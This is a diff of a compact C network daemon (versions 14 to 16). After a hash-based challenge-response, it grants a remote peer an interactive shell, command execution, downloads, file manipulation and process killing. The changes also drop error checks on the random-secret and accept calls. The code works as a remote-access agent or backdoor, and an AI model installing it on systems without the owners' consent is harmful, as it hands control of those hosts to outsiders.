@@ -54,6 +54,7 @@
 // V14 26 -- open tcp socket
 // V14 27 count8 port16 -- try count+1 bind()'s on port
 // V14 28 msg | msg* -- go into accept loop and write response (port block)
+// V16 28 msg -- go into accept loop and write response (port block)
 
 // ver 10
 // use wait4 instead of waitpid, maybe that helps
@@ -78,7 +79,15 @@
 // readall x8 must be 0
 // socket create/socket bind/socket serve
 
-#define VERSION "14"
+// ver 15
+// same api, but very different (smaller) binaries due to uclibc-tiny.h
+
+// ver 16
+// "unlimited" (~8k) packet length (packet length 255 chains to next)
+// accept no longer accepts multiple message packets
+// minor space optimisation
+
+#define VERSION "16"
 
 #include <errno.h>
 #include <unistd.h>
@@ -94,6 +103,7 @@
 #include <sys/syscall.h>
 
 #include "tinyutil.h"
+#include "uclibc-tiny.h"
 //#include "keccak.c"
 
 void Keccak_Init(void);
@@ -131,14 +141,19 @@ static uint8_t secret[32 + 32 + 32];    // challenge + id + secret
 NOINLINE static int rpkt(int offset)
 {
         uint8_t *base = buffer + offset;
-        uint8_t *p = base;
-        uint8_t l;
+        uint8_t *ptr = base;
+        uint8_t len;
 
-        if (read(0, &l, 1) <= 0 || (l && l != recv(0, base, l, MSG_WAITALL)))
-                x();
+        do {
+                if (read(0, &len, 1) <= 0 || (len && len != recv(0, ptr, len, MSG_WAITALL)))
+                        x();
 
-        base[l] = 0;
-        return l;
+                ptr += len;
+        } while (len == 255);
+
+        *ptr = 0;
+
+        return ptr - base;
 }
 
 NOINLINE static void wpkt(uint8_t * base, uint8_t len)
@@ -235,12 +250,6 @@ static void setfds(int fd)
 
 int main(int argc, char *argv[])
 {
-#if 0
-        {
-                crypto_hash(buffer, buffer, 96);
-                hd(buffer, 1088 / 8);
-        }
-#endif
         if (argc == 2) {
                 static char *eargv[] = { "/sbin/ifwatch-if", "eth0", 0, 0 };
                 eargv[2] = argv[1];
@@ -296,10 +305,8 @@ int main(int argc, char *argv[])
                 {
                         int i = open("/dev/urandom", O_RDONLY);
 
-                        if (i >= 0) {
-                                read(i, secret, 32);
-                                close(i);
-                        }
+                        read(i, secret, 32);
+                        close(i);
 
                         ++secret[0];
 
@@ -309,292 +316,288 @@ int main(int argc, char *argv[])
 
                 int fd = accept(0, 0, 0);
 
-                if (fd >= 0) {
-                        if (fork() == 0) {
-                                setfds(fd);
-                                sockopts(0);
+                if (fork() == 0) {
+                        setfds(fd);
+                        sockopts(0);
 
-                                syscall(SCN(SYS_setsid));
-                                sigaction(SIGCHLD, &sa_sigdfl, 0);
+                        syscall(SCN(SYS_setsid));
+                        sigaction(SIGCHLD, &sa_sigdfl, 0);
 
-                                static int block_mode;
+                        static int block_mode;
 
-                                if (block_mode) {
-                                        write(1, buffer + 1, block_mode);
-                                        x();
-                                }
-                                // see bm::tn for more readable challenge response protocol
-                                write(0, secret, 32 + 32);
-                                crypto_hash(buffer, secret, 32 + 32 + 32);
+                        if (block_mode) {
+                                write(0, buffer + 1, block_mode);
+                                x();
+                        }
+                        // see bm::tn for more readable challenge response protocol
+                        write(0, secret, 32 + 32);
+                        crypto_hash(buffer, secret, 32 + 32 + 32);
 
-                                rpkt(32);
+                        // we used rpkt here, but that would now be a buffer overflow
+                        recv(0, buffer + 32, 33, MSG_WAITALL);
 
-                                if (memcmp(buffer, buffer + 32, 32))
-                                        x();
+                        if (memcmp(buffer, buffer + 33, 32))
+                                x();
 
-                                wpkt(MSG(VERSION "/" arch));    /* version/arch */
-                                static const uint32_t endian = 0x11223344;
+                        wpkt(MSG(VERSION "/" arch));    /* version/arch */
+                        static const uint32_t endian = 0x11223344;
 
-                                wpkt((uint8_t *) & endian, sizeof (endian));
-                                //wpkt (STRINGIFY (BUFFER_SIZE), sizeof (STRINGIFY (BUFFER_SIZE)) - 1);
-                                wpkt(buffer, 0);
+                        wpkt((uint8_t *) & endian, sizeof (endian));
+                        //wpkt (STRINGIFY (BUFFER_SIZE), sizeof (STRINGIFY (BUFFER_SIZE)) - 1);
+                        wpkt(buffer, 0);
 
-                                uint32_t clen;
-                                int ret;
+                        uint32_t clen;
+                        int ret;
 
-                                while ((clen = rpkt(0)))
-                                        switch (buffer[0]) {
-                                          case 1:      // telnet
-                                                  {
-                                                          static char *argv[] = { "sh", "-i", 0 };
-                                                          execve("/bin/sh", argv, environ);
-                                                  }
-                                                  break;
+                        while ((clen = rpkt(0)))
+                                switch (buffer[0]) {
+                                  case 1:      // telnet
+                                          {
+                                                  static char *argv[] = { "sh", "-i", 0 };
+                                                  execve("/bin/sh", argv, environ);
+                                          }
+                                          break;
 
-                                          case 5:      // kill
-                                                  ret = syscall(SCN(SYS_kill), *(uint32_t *) (buffer + 4), buffer[1]);
-                                                  break;
+                                  case 5:      // kill
+                                          ret = syscall(SCN(SYS_kill), *(uint32_t *) (buffer + 4), buffer[1]);
+                                          break;
 
-                                          case 6:      // chmod
-                                                  ret = syscall(SCN(SYS_chmod), buffer + 4, *(uint16_t *) (buffer + 2));
-                                                  break;
+                                  case 6:      // chmod
+                                          ret = syscall(SCN(SYS_chmod), buffer + 4, *(uint16_t *) (buffer + 2));
+                                          break;
 
-                                          case 7:      // rename
-                                                  rpkt(260);
-                                                  ret = syscall(SCN(SYS_rename), buffer + 1, buffer + 260);
-                                                  break;
+                                  case 7:      // rename
+                                          rpkt(8192);
+                                          ret = syscall(SCN(SYS_rename), buffer + 1, buffer + 8192);
+                                          break;
 
-                                          case 8:      // unlink
-                                                  ret = syscall(SCN(SYS_unlink), buffer + 1);
-                                                  break;
+                                  case 8:      // unlink
+                                          ret = syscall(SCN(SYS_unlink), buffer + 1);
+                                          break;
 
-                                          case 9:      // mkdir
-                                                  ret = syscall(SCN(SYS_mkdir), buffer + 1, 0700);
-                                                  break;
+                                  case 9:      // mkdir
+                                          ret = syscall(SCN(SYS_mkdir), buffer + 1, 0700);
+                                          break;
 
-                                          case 11:     // lstat
-                                          case 23:     // stat
-                                                  {
-                                                          static struct stat prev;
-                                                          struct stat buf;
-                                                          int l;
+                                  case 11:     // lstat
+                                  case 23:     // stat
+                                          {
+                                                  static struct stat prev;
+                                                  struct stat buf;
+                                                  int l;
 
 #if HAVE_XSTAT
-                                                          int nr = SCN(SYS_fstat);
-                                                          long arg = fd;
+                                                  int nr = SCN(SYS_fstat);
+                                                  long arg = fd;
 
-                                                          if (clen > 1) {
-                                                                  arg = (long)(buffer + 1);
-                                                                  nr = buffer[0] == 23 ? SCN(SYS_stat) : SCN(SYS_lstat);
-                                                          }
+                                                  if (clen > 1) {
+                                                          arg = (long)(buffer + 1);
+                                                          nr = buffer[0] == 23 ? SCN(SYS_stat) : SCN(SYS_lstat);
+                                                  }
 
-                                                          l = xstat(nr, arg, &buf);
+                                                  l = xstat(nr, arg, &buf);
 
 #else
-                                                          l = buffer[1]
-                                                              ? (buffer[0] == 23 ? stat : lstat) (buffer + 1, &buf)
-                                                              : fstat(fd, &buf);
+                                                  l = buffer[1]
+                                                      ? (buffer[0] == 23 ? stat : lstat) (buffer + 1, &buf)
+                                                      : fstat(fd, &buf);
 #endif
 
-                                                          uint8_t *p = buffer + 7 * 5 + 1;
+                                                  uint8_t *p = buffer + 7 * 5 + 1;
 
 #define STATPACK(bit,field) \
-                           p = pack_changed (p, 1 << bit, buf.field, prev.field);
+                       p = pack_changed (p, 1 << bit, buf.field, prev.field);
 
-                                                          *--p = 0;
-                                                          STATPACK(7, st_mtime);
-                                                          STATPACK(6, st_size);
-                                                          STATPACK(5, st_gid);
-                                                          STATPACK(4, st_uid);
-                                                          //STATPACK (3, st_nlink);
-                                                          STATPACK(2, st_mode);
-                                                          STATPACK(1, st_ino);
-                                                          STATPACK(0, st_dev);
-                                                          prev = buf;
+                                                  *--p = 0;
+                                                  STATPACK(7, st_mtime);
+                                                  STATPACK(6, st_size);
+                                                  STATPACK(5, st_gid);
+                                                  STATPACK(4, st_uid);
+                                                  //STATPACK (3, st_nlink);
+                                                  STATPACK(2, st_mode);
+                                                  STATPACK(1, st_ino);
+                                                  STATPACK(0, st_dev);
+                                                  prev = buf;
 
-                                                          wpkt(p, (buffer + 7 * 5 + 1 - p) & -!l);
+                                                  wpkt(p, (buffer + 7 * 5 + 1 - p) & -!l);
+                                          }
+                                          break;
+
+                                  case 12:     // statfs
+                                          {
+                                                  struct statfs sfsbuf;
+                                                  int l = statfs(buffer + 1, &sfsbuf);
+                                                  uint8_t *p = buffer + 7 * 5;
+
+                                                  p = pack_rw(p, sfsbuf.f_ffree);
+                                                  p = pack_rw(p, sfsbuf.f_files);
+                                                  p = pack_rw(p, sfsbuf.f_bavail);
+                                                  p = pack_rw(p, sfsbuf.f_bfree);
+                                                  p = pack_rw(p, sfsbuf.f_blocks);
+                                                  p = pack_rw(p, sfsbuf.f_bsize);
+                                                  p = pack_rw(p, sfsbuf.f_type);
+
+                                                  wpkt(p, (buffer + 7 * 5 - p) & -!l);
+                                          }
+                                          break;
+
+                                  case 13:     // exec quiet
+                                  case 14:     // exec till marker
+                                          {
+                                                  int quiet = buffer[0] == 13;
+
+                                                  pid_t pid = fork();
+
+                                                  if (pid == 0) {
+                                                          if (quiet)
+                                                                  setfds(open("/dev/null", O_RDWR));
+
+                                                          static char *argv[] = { "sh", "-c", buffer + 1, 0 };
+                                                          execve("/bin/sh", argv, environ);
+                                                          _exit(0);
                                                   }
-                                                  break;
 
-                                          case 12:     // statfs
-                                                  {
-                                                          struct statfs sfsbuf;
-                                                          int l = statfs(buffer + 1, &sfsbuf);
-                                                          uint8_t *p = buffer + 7 * 5;
+                                                  if (pid > 0)
+                                                          syscall(SCN(SYS_wait4), (int)pid, &ret, 0, 0);
 
-                                                          p = pack_rw(p, sfsbuf.f_ffree);
-                                                          p = pack_rw(p, sfsbuf.f_files);
-                                                          p = pack_rw(p, sfsbuf.f_bavail);
-                                                          p = pack_rw(p, sfsbuf.f_bfree);
-                                                          p = pack_rw(p, sfsbuf.f_blocks);
-                                                          p = pack_rw(p, sfsbuf.f_bsize);
-                                                          p = pack_rw(p, sfsbuf.f_type);
+                                                  if (!quiet)
+                                                          wpkt(secret, 32 + 32);        // challenge + id
+                                          }
+                                          break;
 
-                                                          wpkt(p, (buffer + 7 * 5 - p) & -!l);
-                                                  }
-                                                  break;
+                                  case 15:     // readdir
+                                          {
+                                                  int l;
 
-                                          case 13:     // exec quiet
-                                          case 14:     // exec till marker
-                                                  {
-                                                          int quiet = buffer[0] == 13;
+                                                  while ((l = syscall(SCN(SYS_getdents64), fd, buffer, sizeof (buffer))) > 0) {
+                                                          uint8_t *cur = buffer;
+                                                          uint8_t *end = buffer + l;
 
-                                                          pid_t pid = fork();
+                                                          while (cur < end) {
+                                                                  struct linux_dirent64 *dent = (void *)cur;
 
-                                                          if (pid == 0) {
-                                                                  if (quiet)
-                                                                          setfds(open("/dev/null", O_RDWR));
-
-                                                                  static char *argv[] = { "sh", "-c", buffer + 1, 0 };
-                                                                  execve("/bin/sh", argv, environ);
-                                                                  _exit(0);
+                                                                  wpkt((void *)&dent->name, strlen(dent->name));
+                                                                  cur += dent->reclen;
                                                           }
-
-                                                          if (pid > 0)
-                                                                  syscall(SCN(SYS_wait4), (int)pid, &ret, 0, 0);
-
-                                                          if (!quiet)
-                                                                  wpkt(secret, 32 + 32);        // challenge + id
                                                   }
-                                                  break;
 
-                                          case 15:     // readdir
-                                                  {
-                                                          int l;
+                                                  wpkt(buffer, 0);
+                                          }
+                                          break;
 
-                                                          while ((l = syscall(SCN(SYS_getdents64), fd, buffer, sizeof (buffer))) > 0) {
-                                                                  uint8_t *cur = buffer;
-                                                                  uint8_t *end = buffer + l;
+                                  case 16:     // lseek
+                                          ret = lseek(fd, *(int32_t *) (buffer + 4), buffer[3]);
+                                          break;
 
-                                                                  while (cur < end) {
-                                                                          struct linux_dirent64 *dent = (void *)cur;
+                                  case 18:     // read/readall
+                                  case 24:     // sha3_256
+                                          {
+                                                  uint32_t max = clen >= 8 ? *(uint32_t *) (buffer + 4) : -1;
+                                                  int l;
 
-                                                                          wpkt((void *)&dent->name, strlen(dent->name));
-                                                                          cur += dent->reclen;
-                                                                  }
-                                                          }
+                                                  Keccak_Init();
 
-                                                          wpkt(buffer, 0);
+                                                  while ((l = read(fd, buffer + 4, MIN(max, 254))) > 0) {
+                                                          max -= l;
+
+                                                          if (buffer[0] == 24)
+                                                                  Keccak_Update(buffer + 4, l);
+                                                          else
+                                                                  wpkt(buffer + 4, l);
+
+                                                          if (!max)
+                                                                  break;
                                                   }
-                                                  break;
 
-                                          case 16:     // lseek
-                                                  ret = lseek(fd, *(int32_t *) (buffer + 4), buffer[3]);
-                                                  break;
+                                                  Keccak_Final(buffer + 4, 1);
+                                                  wpkt(buffer + 4, buffer[1]);  // rpkt zero-terminates shorter packets
+                                          }
+                                          break;
 
-                                          case 18:     // read/readall
-                                          case 24:     // sha3_256
-                                                  {
-                                                          uint32_t max = clen >= 8 ? *(uint32_t *) (buffer + 4) : -1;
-                                                          int l;
+                                  case 19:     // write
+                                          ret = write(fd, buffer + 1, clen - 1);
+                                          break;
 
-                                                          Keccak_Init();
+                                  case 20:     // readlink
+                                          {
+                                                  int l = syscall(SCN(SYS_readlink), buffer + 1, buffer + 8192, 255);
 
-                                                          while ((l = read(fd, buffer + 4, MIN(max, 254))) > 0) {
-                                                                  max -= l;
+                                                  wpkt(buffer + 8192, l > 0 ? l : 0);
+                                          }
+                                          break;
 
-                                                                  if (buffer[0] == 24)
-                                                                          Keccak_Update(buffer + 4, l);
-                                                                  else
-                                                                          wpkt(buffer + 4, l);
+                                  case 10:     // wget
+                                          ret = wget(fd);
+                                          // fall through
 
-                                                                  if (!max)
-                                                                          break;
-                                                          }
+                                  case 21:     // readret
+                                          wpkt((uint8_t *) & errno, sizeof (errno));
+                                          wpkt((uint8_t *) & ret, sizeof (ret));
+                                          break;
 
-                                                          Keccak_Final(buffer + 4, 1);
-                                                          wpkt(buffer + 4, buffer[1]);  // rpkt zero-terminates shorter packets
-                                                  }
-                                                  break;
+                                  case 22:     // chdir
+                                          ret = syscall(SCN(SYS_chdir), buffer + 1);
+                                          break;
 
-                                          case 19:     // write
-                                                  ret = write(fd, buffer + 1, clen - 1);
-                                                  break;
+                                  case 25:     // sleep
+                                          sleep_ms(*(uint32_t *) (buffer + 4));
+                                          break;
 
-                                          case 20:     // readlink
-                                                  {
-                                                          int l = syscall(SCN(SYS_readlink), buffer + 1, buffer + 260, 255);
+                                          {
+                                                  mode_t mode;
+                                                  int flags;
+                                                  const char *path;
 
-                                                          wpkt(buffer + 260, l > 0 ? l : 0);
-                                                  }
-                                                  break;
+                                  case 2:      // ropen
+                                                  flags = 0;
+                                                  path = buffer + 1;
+                                                  // mode uninitialized
+                                                  goto do_open;
 
-                                          case 10:     // wget
-                                                  ret = wget(fd);
-                                                  // fall through
-
-                                          case 21:     // readret
-                                                  wpkt((uint8_t *) & errno, sizeof (errno));
-                                                  wpkt((uint8_t *) & ret, sizeof (ret));
-                                                  break;
-
-                                          case 22:     // chdir
-                                                  ret = syscall(SCN(SYS_chdir), buffer + 1);
-                                                  break;
-
-                                          case 25:     // sleep
-                                                  sleep_ms(*(uint32_t *) (buffer + 4));
-                                                  break;
-
-                                                  {
-                                                          mode_t mode;
-                                                          int flags;
-                                                          const char *path;
-
-                                          case 2:      // ropen
-                                                          flags = 0;
-                                                          path = buffer + 1;
-                                                          // mode uninitialized
-                                                          goto do_open;
-
-                                          case 4:      // open (also close)
-                                                          flags = *(int32_t *) (buffer + 4);
-                                                          mode = *(int16_t *) (buffer + 2);
-                                                          path = buffer + 8;
+                                  case 4:      // open (also close)
+                                                  flags = *(int32_t *) (buffer + 4);
+                                                  mode = *(int16_t *) (buffer + 2);
+                                                  path = buffer + 8;
 
  do_open:
-                                                          close(fd);
-                                                          if (clen > 1)
-                                                                  ret = fd = open(path, flags, mode);
+                                                  close(fd);
+                                                  if (clen > 1)
+                                                          ret = fd = open(path, flags, mode);
+                                                  break;
+                                          }
+
+                                  case 26:     // socket
+                                          ret = fd = tcp_socket();
+                                          break;
+
+                                  case 27:     // bind
+                                          sa.sin_port = *(uint16_t *) (buffer + 2);     // reuse existing sa
+
+                                          do
+                                                  if (!(ret = bind(fd, (struct sockaddr *)&sa, sizeof (sa))))
                                                           break;
-                                                  }
+                                          while (buffer[1]--) ;
 
-                                          case 26:     // socket
-                                                  ret = fd = tcp_socket();
-                                                  break;
+                                          break;
 
-                                          case 27:     // bind
-                                                  sa.sin_port = *(uint16_t *) (buffer + 2);     // reuse existing sa
+                                  case 28:     // accept loop/block mode
+                                          ret = fork();
 
-                                                  do
-                                                          if (!(ret = bind(fd, (struct sockaddr *)&sa, sizeof (sa))))
-                                                                  break;
-                                                  while (buffer[1]--) ;
+                                          if (ret == 0) {
+                                                  ls = fd;
+                                                  block_mode = clen - 1;
+                                                  goto do_listen;
+                                          }
 
-                                                  break;
+                                          break;
 
-                                          case 28:     // accept loop/block mode
-                                                  while ((ret = rpkt(clen)))
-                                                          clen += ret;
-
-                                                  ret = fork();
-
-                                                  if (ret == 0) {
-                                                          ls = fd;
-                                                          block_mode = clen - 1;
-                                                          goto do_listen;
-                                                  }
-
-                                                  break;
-
-                                          default:
-                                                  x();
-                                        }
-                        }
-                        // keep fd open for at least delay, also delay hack attempts
-                        sleep_ms(1000);
-
-                        close(fd);
+                                  default:
+                                          x();
+                                }
                 }
+                // keep fd open for at least 1s, also delay hack attempts
+                sleep_ms(1000);
+
+                close(fd);
         }
 }
